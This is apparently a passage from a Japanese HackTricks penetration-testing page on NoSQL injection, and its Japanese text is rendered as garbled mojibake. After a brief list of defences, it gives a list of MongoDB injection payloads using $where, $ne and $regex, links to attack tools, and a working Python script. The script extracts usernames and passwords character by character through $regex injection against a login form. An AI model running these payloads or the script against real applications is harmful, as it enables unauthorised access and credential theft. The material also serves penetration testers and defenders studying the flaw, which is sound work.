NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‹ã‚‰ä¿è­·ã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

- å…¥åŠ›ã®æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’é©åˆ‡ã«è¡Œã†ã€‚
- ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€è¨±å¯ã•ã‚ŒãŸæ–‡å­—ã®ã¿ã‚’å—ã‘å…¥ã‚Œã‚‹ã€‚
- ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã™ã‚‹ã€‚
- ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã‚’å³å¯†ã«è¨­å®šã™ã‚‹ã€‚

ã“ã‚Œã‚‰ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€NoSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚‹æ”»æ’ƒã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
## ãƒ„ãƒ¼ãƒ«

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### POSTãƒ­ã‚°ã‚¤ãƒ³ã‹ã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ç·å½“ãŸã‚Šæ”»æ’ƒ

ã“ã‚Œã¯ç°¡å˜ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ãŒã€å‰è¿°ã®ãƒ„ãƒ¼ãƒ«ã§ã‚‚ã“ã®ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
print("Extracting password of "+username)
params = {"username":username, "password[$regex]":"", "login": "login"}
password = "^"
while True:
for c in possible_chars:
params["password[$regex]"] = password + c + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
password += c
break
if c == possible_chars[-1]:
print("Found password "+password[1:].replace("\\", "")+" for username "+username)
return password[1:].replace("\\", "")

def get_usernames():
usernames = []
params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
for c in possible_chars:
username = "^" + c
params["username[$regex]"] = username + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
print("Found username starting with "+c)
while True:
for c2 in possible_chars:
params["username[$regex]"] = username + c2 + ".*"
if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
username += c2
print(username)
break

if c2 == possible_chars[-1]:
print("Found username: "+username[1:])
usernames.append(username[1:])
break
return usernames


for u in get_usernames():
get_password(u)
```
## å‚è€ƒæ–‡çŒ®

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹**ãŸã‚ã«ã€PRã‚’æå‡ºã—ã¦[**hacktricks repo**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)ã«å‚åŠ ã—ã¦ãã ã•ã„ã€‚

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ãŠã‚ˆã³**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
